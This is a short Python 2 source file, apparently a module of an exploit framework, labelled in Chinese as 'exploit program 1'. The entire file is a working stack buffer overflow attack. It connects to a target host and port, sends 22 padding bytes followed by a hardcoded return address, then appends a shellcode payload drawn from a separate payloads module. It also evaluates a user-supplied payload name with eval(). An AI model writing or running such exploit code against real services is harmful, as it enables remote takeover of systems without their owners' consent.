#coding:UTF-8
'''漏洞利用程序1'''

import socket
import struct
import sys
sys.path.append("..")
import payloads
from payloads import *

class exploit(object):
	'exploit1'
	def __init__(self, options):
		self.options = options
		self.info = {'ret':0xbffff180, 'offset':22}
	def test(self):
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((self.options['dIP'], int(self.options['dPort'])))
		payload = eval(self.options['payload']).payload()
		ret_addr = struct.pack('!I', self.info['ret'])
		print ret_addr
		data = 'A'*self.info['offset']+struct.pack('!I', self.info['ret'])+payload.data;
		print data
		s.send(data)
		s.close()

if __name__=='__main__':
	pass
